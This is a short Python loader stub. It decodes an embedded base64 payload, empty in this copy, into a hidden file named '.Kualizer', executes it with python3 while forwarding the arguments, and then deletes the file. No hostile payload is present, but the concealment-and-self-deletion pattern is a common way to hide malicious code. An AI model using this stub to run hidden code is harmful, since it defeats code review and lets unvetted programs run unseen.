A = '.Kualizer'
import os, sys, base64 as B
C = ''
try:
    with open(A, 'wb') as D:D.write(B.b64decode(C))
    os.system('python3 .Kualizer'+' '.join(sys.argv[1:]))
except Exception as E:print(E)
finally:
    if os.path.exists(A):os.remove(A)
